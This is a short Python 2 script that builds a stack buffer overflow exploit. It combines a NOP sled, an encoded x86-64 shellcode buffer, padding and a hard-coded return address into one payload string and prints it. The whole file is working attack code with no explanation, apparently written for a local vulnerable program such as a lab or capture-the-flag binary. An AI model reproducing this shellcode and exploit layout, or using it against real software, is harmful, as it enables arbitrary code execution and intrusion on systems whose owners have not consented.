#!/usr/bin/python
# Payload generator

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\xd8\x6f\x2a\x3f\xf3\xb1\x52"
buf += b"\xc4\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\xb2\x46\x72\xa6\x99\xb3\x0d\xae\xd9\x31\x25\x3a\xbb"
buf += b"\x26\x1a\x7d\xda\x6f\x27\x3a\x8c\xb1\x52\xc5\x89\x27"
buf += b"\xa3\xd9\x99\xa1\x08\xae\xf2\x37\x25\x3a\x99\xb2\x0c"
buf += b"\x8c\x27\xa1\x40\x1e\xab\xbe\x57\xb1\x2e\x05\x11\x67"
buf += b"\x6a\xf9\xe9\xeb\xba\x06\x44\x10\x80\xd9\x52\x97\x90"
buf += b"\xe6\xcd\x6d\xa4\xf9\xdb\x22\xd7\x6a\x2a\x3f\xf3\xb1"
buf += b"\x52\xc4"

## Total payload length
payload_length = len(buf)
## Amount of nops
nop_length = 400 - payload_length
## Controlled memory address to return to in Little Endian format
return_address = b"\x7f\xff\xff\xff\xd8\x40"[::-1]
## Building the nop slide
nop_slide = "\x90" * nop_length
## Malicious code injection
## Building the padding between buffer overflow start and return address
padding = b"\x00\x00\x7f\xff\xff\xff\xd8\x10"[::-1] #"AAAABBBB"
print nop_slide + buf + padding + return_address